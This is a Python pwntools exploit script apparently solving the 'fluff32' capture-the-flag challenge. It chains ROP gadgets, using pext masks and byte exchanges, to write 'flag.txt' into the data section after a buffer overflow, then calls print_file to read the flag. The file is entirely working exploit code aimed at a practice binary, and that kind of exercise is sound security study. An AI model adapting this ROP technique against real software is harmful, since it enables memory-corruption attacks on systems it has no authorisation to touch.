from pwn import *
import textwrap
import numpy

# 8 bytes big and writeable
data_section_start = 0x0804a018


def to_bin64(data):
    n = unpack(data, 64)
    return bin(n)[2:]


def int_to_bin32(data):
    # n = unpack(data, 32)
    return bin(data)[2:]


def fill_ecx(val):
    # FILL ECX -> ADR
    # 0x08048558 : pop ecx ; bswap ecx ; ret
    fill_ecx_gadget = pack(0x08048558, 32)

    chain = b""
    chain += fill_ecx_gadget
    chain += pack(val, 32, endianness="big")
    return chain


def write_to_adr(val, adr):
    assert len(val) == 8

    # FILL EDX -> VALUE (1 BYTE)
    # 0x08048543 : mov eax, ebp ; mov ebx,  ;
    #              pext edx, ebx, eax ;
    #              mov eax, 0xdeadbeef ;
    #              ret

    pext_into_edx_gadget = pack(0x08048543, 32)
    # 0x080485bb : pop ebp ; ret
    pop_mask_gadget = pack(0x080485bb, 32)
    # edx = dst (needs to be flag.txt)
    # ebx = src (given) (src1)
    # eax = mask (controlled) (dst)

    # WRITE
    # 0x08048555 : xchg byte ptr [ecx], dl ; ret
    move_byte_gadget = pack(0x08048555, 32)

    # 0xb0bababa = "10110000101110101011101010111010"
    # flag.txt = 111010001111000011101000010111001100111011000010110110001100110
    # dst = "0111010001111000011101000010111001100111011000010110110001100110"
    src = int_to_bin32(0xb0bababa)
    assert src == "10110000101110101011101010111010"

    log.info(f"src: {src}")

    dst = to_bin64(val).zfill(64)
    # assert dst == "0111010001111000011101000010111001100111011000010110110001100110"

    log.info(f"dst: {dst}")

    dst_bytes = textwrap.wrap(dst, 8)
    log.info(f"dst_bytes: {dst_bytes}")
    log.info("############################################################################################################################################################")
    log.info("# FIND MASKS")
    log.info("############################################################################################################################################################")

    masks = []
    for dst_byte in dst_bytes:
        assert len(dst_byte) == 8
        mask = create_mask(src, dst_byte)
        log.info(f"finished mask: {mask}")
        padded_mask = mask.zfill(32)
        log.info(f"padded_mask: {padded_mask}")
        masks.append(mask)


    log.info(f"masks: {masks}")


    log.info("############################################################################################################################################################")
    log.info("# WRITE BYTEWISE TO TARGET")
    log.info("############################################################################################################################################################")

    chain = b""
    index = 0

    for mask in masks[::-1]:
        log.info(f"index: {index}")
        log.info(f"using mask: {mask}")
        chain += pop_mask_gadget
        mask_int_val = int(mask, 2)
        log.info(f"mask_int_val: {mask_int_val}")
        mask_byte_str = pack(mask_int_val, 32)
        log.info(f"mask_byte_str: {mask_byte_str}")
        chain += mask_byte_str
        chain += pext_into_edx_gadget
        chain += fill_ecx(adr+index)
        chain += move_byte_gadget
        index += 1
    return chain


def create_mask(src, dst):
    # find mask so: pext(0xb0bababa,mask) = flag.txt
    src = src[::-1]
    dst = dst[::-1]
    curr_dst_index = 0
    mask = ""
    for curr_src_index in range(len(src)):
        log.info(f"curr_src_index: {curr_src_index}")
        if curr_dst_index == 8:
            return mask
        src_bit = src[curr_src_index]
        log.info(f"src_bit: {src_bit}")
        dst_bit = dst[curr_dst_index]
        log.info(f"dst_bit: {dst_bit}")
        if src_bit == dst_bit:
            mask = "1" + mask
            curr_dst_index += 1
        else:
            mask = "0" + mask
        log.info(f"curr mask: {mask}")
    return mask


binary = "./fluff32"

elf = ELF(binary)
print_file_plt = elf.plt["print_file"]

payload = b""
payload += b"A"*(54-8-2)
payload += write_to_adr(b"flag.txt", data_section_start)
payload += pack(print_file_plt, 32)
payload += b"B"*4
payload += pack(data_section_start, 32)


write("/tmp/docgil", payload)


p = process([binary])
r = p.recv().decode("utf-8")
log.info(f"r: {r}")

p.send(payload)
flag = p.recvall().decode("utf-8")
log.info(f"flag: {flag}")
